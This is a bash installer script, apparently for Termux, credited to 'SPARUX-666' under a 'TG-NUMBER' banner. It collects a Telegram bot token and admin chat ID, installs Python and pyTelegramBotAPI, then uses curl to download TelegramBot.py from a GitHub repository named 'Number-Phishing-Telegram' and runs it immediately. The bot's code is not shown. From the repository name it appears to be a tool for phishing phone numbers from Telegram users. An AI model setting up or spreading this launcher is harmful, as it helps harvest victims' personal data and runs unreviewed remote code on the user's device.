#!/usr/bin/env bash

# Color definitions
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Clear the screen
clear

# Print the banner
echo -e "${RED}
████████╗ ██████╗       ███╗   ██╗██╗   ██╗███╗   ███╗██████╗ ███████╗██████╗ 
╚══██╔══╝██╔════╝       ████╗  ██║██║   ██║████╗ ████║██╔══██╗██╔════╝██╔══██╗
   ██║   ██║  ███╗█████╗██╔██╗ ██║██║   ██║██╔████╔██║██████╔╝█████╗  ██████╔╝
   ██║   ██║   ██║╚════╝██║╚██╗██║██║   ██║██║╚██╔╝██║██╔══██╗██╔══╝  ██╔══██╗
   ██║   ╚██████╔╝      ██║ ╚████║╚██████╔╝██║ ╚═╝ ██║██████╔╝███████╗██║  ██║
   ╚═╝    ╚═════╝       ╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝
                                                                             

  Coded by SPARUX-666
  github: https://github.com/SPARUX-666
\033[33;4mVersion:\033[0m 1.0            \033[33;4mCTRL+C:\033[0m exit          \033[33;4mAuthor:\033[0m SPARUX-666
"

# Ask for the token and id
echo "ENTER BOT TOKEN: "
read -r Token
echo "ENTER ADMIN CHAT ID: "
read -r id

# Export the variables so they can be accessed by the Python script
export TELEGRAM_BOT_TOKEN="$Token"
export TELEGRAM_BOT_ID="$id"

# Update package lists
echo -e "${YELLOW}Updating package lists...${NC}"
pkg update -y

# Install Python if not already installed
echo -e "${YELLOW}Checking for Python installation...${NC}"
if ! command -v python3 &> /dev/null
then
    echo -e "${YELLOW}Python3 not found. Installing Python3...${NC}"
    pkg install python -y
fi

# Install pip if not already installed
if ! command -v pip &> /dev/null
then
    echo -e "${YELLOW}pip not found. Installing pip...${NC}"
    pkg install python-pip -y
fi

# Install telebot library if not already installed
if ! python3 -c "import telebot" &> /dev/null
then
    echo -e "${YELLOW}telebot library not found. Installing telebot...${NC}"
    pip install pyTelegramBotAPI
fi

# Download the Python script from GitHub
echo -e "${YELLOW}Downloading Python script...${NC}"
curl -L -o TelegramBot.py https://raw.githubusercontent.com/Sparux-666/Number-Phishing-Telegram/main/TelegramBot.py

# Run the Python script
echo -e "${GREEN}Running Python script...${NC}"
python3 TelegramBot.py
